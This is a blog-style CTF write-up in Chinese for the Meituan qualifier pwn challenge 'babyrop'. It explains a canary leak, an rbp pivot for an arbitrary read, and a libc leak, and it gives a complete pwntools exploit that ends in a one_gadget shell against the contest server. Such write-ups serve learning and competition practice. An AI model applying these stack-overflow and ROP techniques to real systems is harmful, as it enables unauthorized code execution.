---
layout: article
pageview: true
key: 2021-12-11-meituan-pwn-wp
title: 美团CTF初赛Pwn题WP
author: Ch4rc0al
categories: 
  - WriteUps
tags: 
  - Pwn
  - CTF
---

# 美团CTF初赛Pwn题WP 

## babyrop

题目没有开`PIE`，for循环中可以溢出一位拿到`canary`，在`vul`函数中可以溢出至ret，我们可以返回到代码段`printf`附近的代码，其中`%s`的参数是通过`rbp-0x20`计算得到，我们可以在`vul`函数中溢出时指定`rbp`的值来实现任意地址读，我们读取`got`表或`bss`段相关内容都可以拿到`libc`地址，进而用`one_gadget`拿到shell

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

p=process('./babyrop')
libc=ELF('./libc-2.27.so')
r=remote('123.57.207.81',24844)

local=0

if local!=1:
    p=r

leave_ret=0x0000000000400759
main=0x40075b
p_rdi=0x0000000000400913
p_rsi_r15=0x0000000000400911


p.send('a'*25)

p.recvuntil('a'*25)
canary=u64('\x00'+p.recvn(7))

log.info(hex(canary))
# passwd=0x64726f7773736170
# passwd=0x70617373776f7264
p.sendlineafter('Please input the passwd to unlock this challenge',str(0x4009AE))


p.send('a'*24+p64(canary)+p64(0x601010+0x20)+p64(0x400818))

p.recvuntil('Hello, ')

addr=u64(p.recvn(6)+'\x00\x00')-libc.sym['_IO_2_1_stdout_']
log.info(hex(addr))

ogg=[324565 ,324658 ,1090588]
# p.send('\x00'*25)

# gdb.attach(p)

p.sendlineafter('Please input the passwd to unlock this challenge',str(0x4009AE))

p.send('a'*24+p64(canary)+p64(ogg[0]+addr)*2)


p.interactive()
```

